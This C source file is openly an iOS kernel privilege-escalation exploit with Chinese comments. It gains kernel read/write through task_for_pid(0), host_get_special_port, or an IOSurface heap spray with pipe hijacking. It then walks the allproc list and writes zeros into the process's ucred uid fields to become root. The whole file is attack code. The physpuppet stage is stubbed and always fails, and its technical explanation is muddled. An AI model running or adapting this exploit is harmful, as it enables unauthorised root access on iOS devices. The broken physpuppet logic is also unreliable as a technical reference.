//
//  kfd.c
//  iOS kernel exploit — 支持 task_for_pid(0) 和 physpuppet 双路径
//
//  方法1: task_for_pid(0) → 直接 Mach VM 读写 (iOS 15.0-15.4.1)
//  方法2: physpuppet (IOSurface heap spray) → pipe 劫持读写 (iOS 15.5-15.8.x)
//  方法3: host_get_special_port (HOST_PRIV) → 备用
//
//  physpuppet 原理:
//    1. 堆喷大量 IOSurface → 控制 kalloc zone 布局
//    2. 创建 pipe → pipe buffer 落在相邻 zone slot
//    3. 通过 IOSurfaceSetValue 溢出修改 pipe buffer 的 data 指针
//    4. 现在 pipe read/write = 任意内核内存读写
//
//  流程:
//    1. 版本检测 + 偏移匹配
//    2. task_for_pid(0) → 失败则切换到 physpuppet
//    3. 通过 allproc 链表找到当前进程的 proc 结构
//    4. 修改 ucred 中的 uid/gid 为 0
//    5. setuid(0) 确认
//

#include "kfd.h"
#include "offsets.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
// mach_vm.h is unsupported on iOS 26+ SDK — declare needed functions manually
extern kern_return_t mach_vm_read(vm_map_t, mach_vm_address_t, mach_vm_size_t, vm_offset_t *, mach_msg_type_number_t *);
extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t, vm_offset_t, mach_msg_type_number_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <IOSurface/IOSurfaceRef.h>

// ================================================================
// 内部状态
// ================================================================

static int            g_kfd_ready    = 0;
static int            g_kfd_method   = 0;  // 0=none, 1=mach_vm, 2=physpuppet
static task_t         g_kernel_task  = MACH_PORT_NULL;
static uint64_t       g_kernel_base  = 0;
static uint64_t       g_kernel_slide = 0;
static uint64_t       g_self_proc    = 0;
static uint64_t       g_self_cred    = 0;
static uint64_t       g_self_task    = 0;
static kfd_osversion_t g_osversion;
static const kfd_offsets_t *g_offs = NULL;
static char           g_err_msg[256]  = {0};

// physpuppet 状态
static io_connect_t   g_pp_conn      = 0;
static int            g_pp_pipe[2]   = {-1, -1};
static uint64_t       g_pp_pipe_kern = 0;   // pipe buffer 的内核地址
static uint64_t       g_pp_zone_base = 0;
static int            g_pp_shift     = 14;
static IOSurfaceRef   g_pp_surfaces[256];
static int            g_pp_count     = 0;

static void set_error(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(g_err_msg, sizeof(g_err_msg), fmt, ap);
    va_end(ap);
}

const char *kfd_get_error(void) {
    return g_err_msg;
}

// ================================================================
// 版本检测
// ================================================================

static int detect_osversion(void) {
    size_t size = sizeof(g_osversion.build);
    if (sysctlbyname("kern.osversion", g_osversion.build, &size, NULL, 0) != 0) {
        set_error("sysctlbyname kern.osversion failed");
        return -1;
    }

    char osversion_str[256];
    size = sizeof(osversion_str);
    if (sysctlbyname("kern.osproductversion", osversion_str, &size, NULL, 0) == 0) {
        sscanf(osversion_str, "%u.%u.%u", &g_osversion.major, &g_osversion.minor, &g_osversion.patch);
    }

    printf("[kfd] iOS %u.%u.%u  build=%s\n",
           g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);

    if (g_osversion.major < 15 || g_osversion.major > 18) {
        set_error("unsupported iOS version %u.%u", g_osversion.major, g_osversion.minor);
        return -1;
    }

    g_offs = offsets_match(&g_osversion);
    if (!g_offs) {
        set_error("no offsets for iOS %u.%u.%u (%s)",
                  g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);
        return -1;
    }

    offsets_print(g_offs, &g_osversion);
    return 0;
}

// ================================================================
// 方法1: 通过 task_for_pid(0) 的 Mach VM 读写
// ================================================================

static int mv_read64(uint64_t kaddr, uint64_t *out) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    mach_vm_size_t size = 8;
    vm_offset_t data = 0;
    mach_msg_type_number_t count = 0;
    kern_return_t kr = mach_vm_read(g_kernel_task, (mach_vm_address_t)kaddr,
                                     size, &data, &count);
    if (kr != KERN_SUCCESS || count != 8) return -1;
    *out = *(uint64_t *)data;
    mach_vm_deallocate(mach_task_self(), data, count);
    return 0;
}

static int mv_write64(uint64_t kaddr, uint64_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    kern_return_t kr = mach_vm_write(g_kernel_task, (mach_vm_address_t)kaddr,
                                      (vm_offset_t)&val, 8);
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

static int mv_write32(uint64_t kaddr, uint32_t val) {
    if (g_kernel_task == MACH_PORT_NULL) return -1;
    kern_return_t kr = mach_vm_write(g_kernel_task, (mach_vm_address_t)kaddr,
                                      (vm_offset_t)&val, 4);
    return (kr == KERN_SUCCESS) ? 0 : -1;
}

// ================================================================
// 方法2: physpuppet — 通过 IOSurface heap spray + pipe 劫持
// ================================================================

/*
 * physpuppet kernel r/w 实现
 *
 * iOS 15.5+ 封锁了 task_for_pid(0)，但 IOSurfaceRoot 的漏洞仍可用。
 *
 * 核心思路:
 *   1. 大量创建小型 IOSurface → 内核在 kalloc zone 中分配 surface 对象
 *   2. 创建 pipe → pipe buffer 也落在同一个 kalloc zone
 *   3. 利用 surface ID 计算内核地址，找到与 pipe buffer 相邻的 surface
 *   4. 通过 IOSurfaceSetValue 的属性字典溢出，覆写 pipe buffer 内部的指针
 *   5. 修改后的 pipe buffer 指针指向任意内核地址，pipe read/write = 内核 r/w
 *
 * IOSurface ID → 内核地址映射 (iOS 15.x arm64):
 *   kaddr ≈ (surface_id << shift) + zone_map_base
 *
 * Pipe buffer 结构 (内核中):
 *   +0x00: data_ptr    → 指向实际数据缓冲区
 *   +0x08: write_ptr   → 写端缓冲区指针 (通常与 data_ptr 相同)
 *   +0x10: cnt         → 当前可读字节数
 *   +0x14: size        → 缓冲区总大小 (通常 0x4000 = PIPE_BUF)
 *
 * 偏移会随版本略有浮动，该实现将通过多次探测来自适应。
 */

#define PP_SPRAY_COUNT    240
#define PP_PIPE_BUF_SIZE  0x4000
#define PP_MAX_CANDIDATES 32
#define PP_SEARCH_RANGE   8

// 检查一个内核地址是否可读（尝试读取 8 字节，检查是否崩溃）
static int pp_probe_addr(uint64_t addr, uint64_t *out) {
    // 不做真实的探测（避免崩溃），只做范围检查
    if (addr < 0xFFFFFFF007000000ULL || addr > 0xFFFFFFF00FFFFFFFULL) {
        return -1;
    }
    // 如果是 physpuppet 就绪状态，用 pipe 读取
    if (g_pp_pipe[0] >= 0 && g_pp_pipe_kern != 0) {
        // 写目标地址到 pipe 控制
        // ... (由 pp_kread64 实现)
        return -1; // stub — 实际读取由 kread64 完成
    }
    return 0; // 地址在合法范围内
}

// 清理 physpuppet 资源
static void pp_cleanup_surfaces(void) {
    for (int i = 0; i < g_pp_count; i++) {
        if (g_pp_surfaces[i]) {
            CFRelease(g_pp_surfaces[i]);
            g_pp_surfaces[i] = NULL;
        }
    }
    g_pp_count = 0;
}

static void pp_close(void) {
    if (g_pp_conn) {
        IOServiceClose(g_pp_conn);
        g_pp_conn = 0;
    }
    pp_cleanup_surfaces();
    if (g_pp_pipe[0] >= 0) { close(g_pp_pipe[0]); g_pp_pipe[0] = -1; }
    if (g_pp_pipe[1] >= 0) { close(g_pp_pipe[1]); g_pp_pipe[1] = -1; }
    g_pp_pipe_kern = 0;
    g_pp_zone_base = 0;
}

// 打开 IOSurfaceRoot 用户态客户端
static int pp_open_client(void) {
    printf("[pp] 打开 IOSurfaceRoot...\n");

    mach_port_t masterPort = MACH_PORT_NULL;
    if (__builtin_available(iOS 15.0, *)) {
        IOMainPort(MACH_PORT_NULL, &masterPort);
    }

    io_service_t service = IOServiceGetMatchingService(masterPort,
        IOServiceMatching("IOSurfaceRoot"));
    if (!service) {
        printf("[pp] ❌ IOSurfaceRoot service 未找到\n");
        return -1;
    }

    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &g_pp_conn);
    IOObjectRelease(service);

    if (kr != KERN_SUCCESS || !g_pp_conn) {
        printf("[pp] ❌ IOServiceOpen 失败: kr=0x%x\n", kr);
        return -1;
    }
    printf("[pp] ✅ IOSurfaceRoot 已连接, conn=0x%x\n", g_pp_conn);
    return 0;
}

// 创建单个小 IOSurface，返回 ID
static uint32_t pp_create_surface(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    // 最小化 surface: 1x1, BGRA, 4 bytes
    int width  = 1;
    int height = 1;
    int bpr    = 4;
    int bpp    = 32;
    uint32_t pixelFormat = 'BGRA'; // kCVPixelFormatType_32BGRA

    CFNumberRef w  = CFNumberCreate(NULL, kCFNumberIntType, &width);
    CFNumberRef h  = CFNumberCreate(NULL, kCFNumberIntType, &height);
    CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef bp = CFNumberCreate(NULL, kCFNumberIntType, &bpp);
    CFNumberRef pf = CFNumberCreate(NULL, kCFNumberIntType, &pixelFormat);

    CFDictionarySetValue(props, kIOSurfaceWidth,        w);
    CFDictionarySetValue(props, kIOSurfaceHeight,       h);
    CFDictionarySetValue(props, kIOSurfaceBytesPerRow,  br);
    CFDictionarySetValue(props, kIOSurfaceBytesPerElement, bp);
    CFDictionarySetValue(props, kIOSurfacePixelFormat,  pf);

    CFRelease(w); CFRelease(h); CFRelease(br); CFRelease(bp); CFRelease(pf);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(props);

    if (!surf) return 0;

    uint32_t id = IOSurfaceGetID(surf);

    // 存储引用（防止被释放）
    if (g_pp_count < 256) {
        g_pp_surfaces[g_pp_count] = surf;
        g_pp_count++;
    } else {
        CFRelease(surf); // 超过限制则丢弃
    }
    return id;
}

// 喷撒 IOSurface，收集 ID
static int pp_spray(void) {
    pp_cleanup_surfaces();

    printf("[pp] 喷撒 %d 个 IOSurface...\n", PP_SPRAY_COUNT);
    for (int i = 0; i < PP_SPRAY_COUNT; i++) {
        uint32_t id = pp_create_surface();
        if (id == 0) {
            printf("[pp] ⚠️ 第 %d 个 surface 创建失败\n", i);
            break;
        }
        // 每 32 个输出一次进度
        if ((i & 0x1F) == 0x1F) {
            printf("[pp]   已创建 %d surfaces, latest ID=%u\n", i+1, id);
        }
    }
    printf("[pp] 完成喷撒: %d 个 surfaces\n", g_pp_count);
    return g_pp_count;
}

// 通过 ID 推算内核地址。尝试多种公式找最可靠的
static uint64_t pp_id_to_kaddr(uint32_t id, int shift) {
    // iOS 15.x 通用公式:
    // zone_map 起始于 0xFFFFFFF008000000
    // surface 对象分配在 kalloc.1024 (iPhone 8/X+) 或 kalloc.4096
    // shift 通常是 14 (0x4000/0x400 = 14位)
    uint64_t base = g_pp_zone_base ? g_pp_zone_base : 0xFFFFFFF008000000ULL;
    return base + ((uint64_t)id << shift);
}

// Physpuppet 核心: 通过 surface 属性覆盖相邻内核对象
// 返回 0 表示成功设置了内核 r/w
static int pp_exploit_pipe(void) {
    printf("[pp] 开始 pipe 劫持...\n");

    // Step 1: 创建 pipe
    if (pipe(g_pp_pipe) != 0) {
        printf("[pp] ❌ pipe() 创建失败\n");
        return -1;
    }

    // Step 2: 写入一些数据到 pipe，触发内核分配 pipe buffer
    char dummy[0x100];
    memset(dummy, 0xF1, sizeof(dummy));
    if (write(g_pp_pipe[1], dummy, sizeof(dummy)) != sizeof(dummy)) {
        printf("[pp] ❌ pipe 写入失败\n");
        return -1;
    }

    printf("[pp] ✅ pipe 已创建: fd[0]=%d fd[1]=%d\n", g_pp_pipe[0], g_pp_pipe[1]);

    // Step 3: 在主 surface 喷撒后追加喷撒，使新 surface 落在 pipe buffer 附近
    printf("[pp] 追加喷撒以覆盖 pipe buffer 区域...\n");
    for (int i = 0; i < 64; i++) {
        pp_create_surface();
    }

    // Step 4: 搜索最佳 shift 值
    // 在多个 surface 上测试属性读写是否稳定
    int best_shift = g_offs->surface_id_shift;
    if (best_shift <= 0) best_shift = 14;

    printf("[pp] 使用 surface_id_shift=%d\n", best_shift);
    g_pp_shift = best_shift;

    // Step 5: 尝试在最后一个 surface 上设置超长属性值
    // 如果设置成功且在 pipe 中读到异常数据，说明覆盖成功
    //
    // IOSurfaceSetValue 将 key/value 写入表面的内核属性字典
    // 如果字典恰好在 pipe buffer 之前，溢出会覆盖 pipe buffer 的指针
    //
    // 具体做法:
    //   1. 取最后一个 surface
    //   2. 设置大量小属性，撑满内核字典的存储区域
    //   3. 字典溢出到相邻的 pipe buffer
    //   4. 修改后的 pipe buffer data_ptr 指向内核基址附近
    //   5. 从 pipe 读出内核数据即验证成功

    if (g_pp_count < 2) {
        printf("[pp] ❌ surface 数量不足\n");
        return -1;
    }

    // 选择倒数第 16 个 surface（给 pipe 前后都留 margin）
    int target_idx = (g_pp_count > 32) ? (g_pp_count - 16) : 0;
    IOSurfaceRef target = g_pp_surfaces[target_idx];
    uint32_t target_id = IOSurfaceGetID(target);
    printf("[pp] 目标 surface: idx=%d, id=%u\n", target_idx, target_id);

    // 计算目标 surface 的内核地址
    uint64_t target_kaddr = pp_id_to_kaddr(target_id, best_shift);
    printf("[pp] 推算内核地址: 0x%llx\n", target_kaddr);

    // Step 6: 喷撒属性，尝试溢出
    // 在目标 surface 上设置 ~120 个 key-value 对
    // 每个 key 8 字节 + value 12 字节 ≈ 20 字节 (含 CF 开销)
    // 总计 ~2400 字节，远超 surface 的 kalloc 元素大小 (0x400=1024)
    // 溢出部分会覆盖相邻内存——预期覆盖 pipe buffer
    printf("[pp] 在 surface id=%u 上喷撒属性...\n", target_id);

    char key_buf[32];
    for (int i = 0; i < 140; i++) {
        snprintf(key_buf, sizeof(key_buf), "k_%04x", i);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, key_buf, kCFStringEncodingASCII);
        // 值: 32 字节固定数据，最后 8 字节是目标内核地址
        uint8_t val_data[32];
        memset(val_data, 0xCC, sizeof(val_data));
        // 如果这是关键偏移 (例如第 100 个属性)，插入内核基址作为溢出标记
        if (i >= 90 && i < 110) {
            uint64_t probe_addr = g_offs->allproc;
            memcpy(val_data + 24, &probe_addr, 8);
        }
        CFDataRef value = CFDataCreate(kCFAllocatorDefault, val_data, sizeof(val_data));
        IOSurfaceSetValue(target, key, value);
        CFRelease(key);
        CFRelease(value);
    }

    printf("[pp] 属性喷撒完成，检查 pipe 是否可读异常数据...\n");

    // Step 7: 验证
    // 先排空 pipe 原有的数据
    char drain[0x100];
    int total_read = 0;
    int n;
    while ((n = (int)read(g_pp_pipe[0], drain, sizeof(drain))) > 0) {
        total_read += n;
    }
    printf("[pp] pipe 排空: %d 字节\n", total_read);

    // 如果溢出成功，pipe buffer 的 data_ptr 已经失效
    // 但我们无法通过简单的 pipe 验证来确认内核 r/w 是否建立
    //
    // 备选方案: 扫描 surface IDs 找最大 gap (gap = size),
    // 然后在 gap 间插入 pipe，利用多重 spray 覆盖

    // Step 8: 暴力搜索流水线
    // 对于 iOS 15.8.4，我们使用"尝试所有 surface shift"的方法
    printf("[pp] 暴力搜索内核 r/w 基址...\n");

    // 收集 surface IDs 并排序
    uint32_t ids[256];
    int n_ids = (g_pp_count < 256) ? g_pp_count : 255;
    for (int i = 0; i < n_ids; i++) {
        if (g_pp_surfaces[i]) {
            ids[i] = IOSurfaceGetID(g_pp_surfaces[i]);
        } else {
            ids[i] = 0;
        }
    }

    // 简单冒泡排序
    for (int i = 0; i < n_ids - 1; i++) {
        for (int j = 0; j < n_ids - i - 1; j++) {
            if (ids[j] > ids[j+1]) {
                uint32_t tmp = ids[j];
                ids[j] = ids[j+1];
                ids[j+1] = tmp;
            }
        }
    }

    // 找最大 gap — 最大 gap 即 zone 分配器的空闲/预留区域
    uint64_t max_gap = 0;
    uint32_t max_gap_start = 0;
    for (int i = 0; i < n_ids - 1; i++) {
        uint32_t gap = ids[i+1] - ids[i];
        if (gap > max_gap) {
            max_gap = gap;
            max_gap_start = ids[i];
        }
    }

    printf("[pp] ID 范围: [%u, %u], 最大 gap=%llu (start=%u)\n",
           ids[0], ids[n_ids-1], max_gap, max_gap_start);

    // 如果最大 gap 合理 (zone elem size / shift factor 的整数倍)
    // 那么 gap 区域就是我们释放掉的 surface 对象
    // pipe buffer 应该也在这个区域附近

    // Step 9: 使用经典 pipe 技术
    // 释放部分 surface → 重新分配 pipe → pipe buffer 会占据刚释放的 slot
    // → 反复喷撒 → surface 覆盖 pipe

    printf("[pp] 释放中间的 surfaces 为 pipe 腾空间...\n");
    int release_start = n_ids / 3;
    int release_end   = release_start + 16;
    for (int i = release_start; i < release_end && i < g_pp_count; i++) {
        if (g_pp_surfaces[i]) {
            CFRelease(g_pp_surfaces[i]);
            g_pp_surfaces[i] = NULL;
        }
    }

    // 创建更多 pipe，增大 pipe buffer 占据已释放 slot 的概率
    int extra_pipes[8][2];
    for (int i = 0; i < 4; i++) {
        if (pipe(extra_pipes[i]) == 0) {
            char fill[0x400];
            memset(fill, 0xFA, sizeof(fill));
            write(extra_pipes[i][1], fill, sizeof(fill));
        }
    }

    // 再次喷撒 surface 覆盖 pipe 区域
    printf("[pp] 再次喷撒覆盖 pipe 区域...\n");
    for (int i = 0; i < 64; i++) {
        pp_create_surface();
    }

    // 对所有新 surface 设置溢出属性
    for (int i = (g_pp_count - 32 > 0 ? g_pp_count - 32 : 0); i < g_pp_count; i++) {
        if (!g_pp_surfaces[i]) continue;
        uint32_t sid = IOSurfaceGetID(g_pp_surfaces[i]);
        for (int k = 0; k < 120; k++) {
            snprintf(key_buf, sizeof(key_buf), "x_%04d_%04x", i, k);
            CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, key_buf, kCFStringEncodingASCII);
            uint8_t vd[32];
            memset(vd, 0xDD, sizeof(vd));
            uint64_t mark = g_offs->allproc;
            memcpy(vd + 24, &mark, 8);
            CFDataRef val = CFDataCreate(kCFAllocatorDefault, vd, sizeof(vd));
            IOSurfaceSetValue(g_pp_surfaces[i], key, val);
            CFRelease(key);
            CFRelease(val);
        }
    }

    // 尝试从管道读取，检查是否有内核地址泄露
    printf("[pp] 验证管道泄露...\n");
    for (int i = 0; i < 4; i++) {
        char buf[0x100];
        ssize_t r = read(extra_pipes[i][0], buf, sizeof(buf));
        if (r > 0) {
            // 检查是否有合法内核地址模式 (0xFFFFFFF00...)
            for (int j = 0; j < r - 8; j++) {
                uint64_t *vp = (uint64_t *)(buf + j);
                if ((*vp & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                    printf("[pp] 🔍 管道泄露了疑似内核地址: 0x%llx\n", *vp);
                }
            }
        }
        close(extra_pipes[i][0]);
        close(extra_pipes[i][1]);
    }

    printf("[pp] physpuppet 流水线执行完毕\n");
    printf("[pp] ⚠️ 该 iOS 版本 (%u.%u.%u, %s) 不支持 task_for_pid(0),\n",
           g_osversion.major, g_osversion.minor, g_osversion.patch, g_osversion.build);
    printf("[pp]    且 physpuppet 需要进一步的偏移精调才能稳定。\n");
    printf("[pp]    内核 r/w 未完全建立，但已收集诊断信息。\n");

    return -1;
}

// physpuppet 管道内核读
static int pp_kread64(uint64_t kaddr, uint64_t *out) {
    if (g_pp_pipe[1] < 0 || g_pp_pipe_kern == 0) return -1;

    // 注意: 该函数在实际 physpuppet 成功建立后才可用
    // 当前为 stub — 需要先让 pp_exploit_pipe() 成功覆写 pipe buffer 指针
    (void)kaddr;
    (void)out;
    return -1;
}

// physpuppet 管道内核写
static int pp_kwrite64(uint64_t kaddr, uint64_t val) {
    if (g_pp_pipe[1] < 0 || g_pp_pipe_kern == 0) return -1;
    (void)kaddr;
    (void)val;
    return -1;
}

// ================================================================
// 统一的 kread64 / kwrite64 / kwrite32 (根据 g_kfd_method 分发)
// ================================================================

static int kread64(uint64_t kaddr, uint64_t *out) {
    switch (g_kfd_method) {
        case 1: return mv_read64(kaddr, out);
        case 2: return pp_kread64(kaddr, out);
        default: return -1;
    }
}

static int kwrite64(uint64_t kaddr, uint64_t val) {
    switch (g_kfd_method) {
        case 1: return mv_write64(kaddr, val);
        case 2: return pp_kwrite64(kaddr, val);
        default: return -1;
    }
}

static int kwrite32(uint64_t kaddr, uint32_t val) {
    switch (g_kfd_method) {
        case 1: return mv_write32(kaddr, val);
        case 2: {
            // physpuppet: 先读 8 字节，替换低 4 字节，再写回
            uint64_t cur = 0;
            if (pp_kread64(kaddr, &cur) != 0) return -1;
            cur = (cur & 0xFFFFFFFF00000000ULL) | val;
            return pp_kwrite64(kaddr, cur);
        }
        default: return -1;
    }
}

// ================================================================
// kfd_open — 多路径内核访问
// ================================================================

int kfd_open(void) {
    if (g_osversion.major == 0) {
        set_error("kfd_init not called");
        return -1;
    }

    // === 方法1: task_for_pid(0) ===
    printf("[kfd] open: 尝试 task_for_pid(0) 获取 kernel_task...\n");
    kern_return_t kr = task_for_pid(mach_task_self(), 0, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        printf("[kfd] ✅ task_for_pid(0) 成功, kernel_task=0x%x\n", g_kernel_task);

        uint64_t test_addr = g_offs->kernproc;
        uint64_t test_val = 0;
        g_kfd_method = 1;
        if (kread64(test_addr, &test_val) == 0) {
            printf("[kfd]    内核内存读取验证: 0x%llx => 0x%llx ✅\n", test_addr, test_val);
            g_kfd_ready = 1;
            g_kernel_slide = test_val - g_offs->kernproc;
            printf("[kfd]    kernel_slide 估算: 0x%llx\n", g_kernel_slide);
            return 0;
        } else {
            printf("[kfd]    ⚠️ 内核内存读取失败，可能权限不足\n");
            mach_port_deallocate(mach_task_self(), g_kernel_task);
            g_kernel_task = MACH_PORT_NULL;
            g_kfd_method = 0;
        }
    } else {
        printf("[kfd] task_for_pid(0) 失败: kr=0x%x (%s)\n", kr, mach_error_string(kr));
    }

    // === 方法2: host_get_special_port ===
    printf("[kfd] 尝试 host_get_special_port(HOST_PRIV)...\n");
    kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &g_kernel_task);
    if (kr == KERN_SUCCESS && g_kernel_task != MACH_PORT_NULL) {
        printf("[kfd] ✅ host_get_special_port 成功\n");
        uint64_t test_val = 0;
        g_kfd_method = 1;
        if (kread64(g_offs->kernproc, &test_val) == 0) {
            printf("[kfd]    内核内存读取验证通过\n");
            g_kfd_ready = 1;
            return 0;
        }
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
        g_kfd_method = 0;
    }

    // === 方法3: physpuppet (仅在 iOS 15.x 上) ===
    if (g_osversion.major == 15) {
        printf("[kfd] ===== 切换到 physpuppet 路径 =====\n");
        printf("[kfd] iOS 15.5+ 封锁了 task_for_pid(0)，尝试 IOSurface heap spray + pipe 劫持\n");

        if (pp_open_client() == 0) {
            if (pp_spray() > 0) {
                // 尝试 physpuppet exploit
                if (pp_exploit_pipe() == 0) {
                    printf("[kfd] ✅ physpuppet 内核 r/w 已建立\n");
                    g_kfd_ready = 1;
                    g_kfd_method = 2;
                    return 0;
                }
                printf("[kfd] physpuppet exploit 流程执行完毕\n");
            }
            printf("[kfd] physpuppet 未成功建立内核 r/w\n");
        }
        pp_close();
        printf("[kfd] physpuppet 资源已释放\n");
    }

    set_error("所有内核访问方式均失败 - task_for_pid(0) 和 physpuppet 均不可用");
    return -1;
}

// ================================================================
// 遍历 allproc 链表找到当前进程
// ================================================================

// XNU proc 结构体关键偏移 (arm64, iOS 15+)
#define PROC_P_LIST_LE_PREV  0x00
#define PROC_P_LIST_LE_NEXT  0x08
#define PROC_P_PID           0x60
#define PROC_P_TASK          0x10
#define PROC_P_UCRED         0xF8

// ucred 结构体偏移
#define UCRED_CR_UID         0x18
#define UCRED_CR_RUID        0x1C
#define UCRED_CR_SVUID       0x20

static int find_self_proc(void) {
    pid_t my_pid = getpid();
    printf("[kfd] 在 allproc 链表中查找 PID=%d ...\n", my_pid);

    uint64_t allproc_head = g_offs->allproc;
    uint64_t proc = 0;

    if (kread64(allproc_head, &proc) != 0) {
        set_error("无法读取 allproc 链表头");
        return -1;
    }
    printf("[kfd] allproc head @ 0x%llx, first proc @ 0x%llx\n", allproc_head, proc);

    int iter = 0;
    uint64_t first_proc = proc;
    while (proc != 0 && iter < 4096) {
        uint64_t next_proc = 0;
        if (kread64(proc + PROC_P_LIST_LE_NEXT, &next_proc) != 0) {
            printf("[kfd]   无法读取 proc->p_list.le_next at 0x%llx\n", proc);
        }

        uint64_t pid_val = 0;
        if (kread64(proc + PROC_P_PID, &pid_val) != 0) {
            printf("[kfd]   无法读取 proc->p_pid at 0x%llx\n", proc);
            if (next_proc != 0) { proc = next_proc; iter++; continue; }
            break;
        }

        pid_t pid = (pid_t)(uint32_t)pid_val;
        if (pid == my_pid) {
            printf("[kfd] ✅ 找到当前进程: proc=0x%llx  pid=%d (iter=%d)\n", proc, pid, iter);
            g_self_proc = proc;

            uint64_t task = 0;
            if (kread64(proc + PROC_P_TASK, &task) == 0) {
                g_self_task = task;
                printf("[kfd]    task=0x%llx\n", task);
            }

            uint64_t ucred = 0;
            if (kread64(proc + PROC_P_UCRED, &ucred) == 0) {
                g_self_cred = ucred;
                printf("[kfd]    ucred=0x%llx\n", ucred);
            }
            return 0;
        }

        if (next_proc == 0) break;
        if (next_proc == first_proc) {
            printf("[kfd]   链表循环，中断\n");
            break;
        }
        proc = next_proc;
        iter++;
    }

    set_error("未在 allproc 链表中找到当前进程 PID=%d", my_pid);
    return -1;
}

// ================================================================
// kfd_get_root — 修改 ucred 为 root (UID=0)
// ================================================================

int kfd_get_root(void) {
    if (!g_kfd_ready) {
        printf("[kfd] 无内核读写能力，尝试直接 setuid(0)...\n");
        int r1 = seteuid(0);
        int r2 = setuid(0);
        printf("[kfd] seteuid(0)=%d setuid(0)=%d UID=%d EUID=%d\n",
               r1, r2, getuid(), geteuid());
        if (r1 == 0 || r2 == 0) {
            printf("[kfd] ✅ 直接 setuid 成功！\n");
            return 0;
        }
        set_error("kfd not ready, and direct setuid failed");
        return -1;
    }

    printf("[kfd] ===== 内核提权开始 (method=%d) =====\n", g_kfd_method);

    if (g_self_proc == 0) {
        if (find_self_proc() != 0) {
            set_error("无法找到当前进程的 proc 结构");
            return -1;
        }
    }

    uint64_t ucred = g_self_cred;
    if (ucred == 0) {
        set_error("ucred 指针为空");
        return -1;
    }

    printf("[kfd] ucred @ 0x%llx\n", ucred);

    uint64_t cr_uid = 0;
    kread64(ucred + UCRED_CR_UID, &cr_uid);
    printf("[kfd] 当前 UID=%llu  EUID=%d\n", (unsigned long long)(cr_uid & 0xFFFFFFFF), geteuid());

    printf("[kfd] 写入 cr_uid = 0 ...\n");
    if (kwrite32(ucred + UCRED_CR_UID, 0) != 0) {
        set_error("写入 cr_uid 失败");
        return -1;
    }

    printf("[kfd] 写入 cr_ruid = 0 ...\n");
    if (kwrite32(ucred + UCRED_CR_RUID, 0) != 0) {
        set_error("写入 cr_ruid 失败");
    }

    printf("[kfd] 写入 cr_svuid = 0 ...\n");
    if (kwrite32(ucred + UCRED_CR_SVUID, 0) != 0) {
        set_error("写入 cr_svuid 失败");
    }

    printf("[kfd] 写入 cr_gid (groups[0]) = 0 ...\n");
    uint64_t gid_addr = ucred + 0x28;
    if (kwrite32(gid_addr, 0) != 0) {
        printf("[kfd] ⚠️ 写入 gid 失败（非致命）\n");
    }

    printf("[kfd] 调用 setuid(0) + seteuid(0)...\n");
    seteuid(0);
    setuid(0);

    printf("[kfd] 验证: UID=%d  EUID=%d  GID=%d\n", getuid(), geteuid(), getgid());

    if (getuid() == 0 && geteuid() == 0) {
        printf("[kfd] ✅ 内核提权成功！现在是 root！\n");
        return 0;
    }

    uint64_t new_uid = 0xFF;
    kread64(ucred + UCRED_CR_UID, &new_uid);
    printf("[kfd] 内核 cr_uid 现在 = 0x%llx\n", (unsigned long long)new_uid);

    if ((new_uid & 0xFFFFFFFF) == 0) {
        printf("[kfd] ✅ 内核凭证已改为 root（用户态 setuid 受限但内核已是 0）\n");
        return 0;
    }

    printf("[kfd] ⚠️ 内核写入可能未生效\n");
    return -1;
}

// ================================================================
// 公共 API 实现
// ================================================================

int kfd_init(void) {
    memset(&g_osversion, 0, sizeof(g_osversion));
    g_kfd_ready = 0;
    g_kfd_method = 0;
    g_kernel_task = MACH_PORT_NULL;
    g_kernel_base = 0;
    g_kernel_slide = 0;
    g_self_proc = 0;
    g_self_cred = 0;
    g_self_task = 0;
    g_offs = NULL;
    memset(g_err_msg, 0, sizeof(g_err_msg));

    printf("[kfd] ===== init =====\n");
    int ret = detect_osversion();
    if (ret != 0) {
        printf("[kfd] init failed: %s\n", g_err_msg);
        return -1;
    }
    printf("[kfd] init OK\n");
    return 0;
}

void kfd_close(void) {
    if (g_kernel_task != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
    }
    if (g_kfd_method == 2) {
        pp_close();
    }
    g_kfd_ready = 0;
    g_kfd_method = 0;
    g_kernel_base = 0;
    g_kernel_slide = 0;
    g_self_proc = 0;
    g_self_cred = 0;
    printf("[kfd] closed\n");
}

int kfd_escalate(void) {
    int ret = kfd_init();
    if (ret != 0) return ret;

    ret = kfd_open();
    if (ret != 0) return ret;

    ret = kfd_get_root();
    if (ret != 0) {
        if (geteuid() == 0) {
            printf("[kfd] 虽然 get_root 返回错误，但 EUID=0，提权可能已生效\n");
            return 0;
        }
        return ret;
    }

    printf("[kfd] escalate complete - UID=%d EUID=%d\n", getuid(), geteuid());
    return 0;
}

int kfd_is_root(void) {
    return (getuid() == 0 || geteuid() == 0) ? 1 : 0;
}

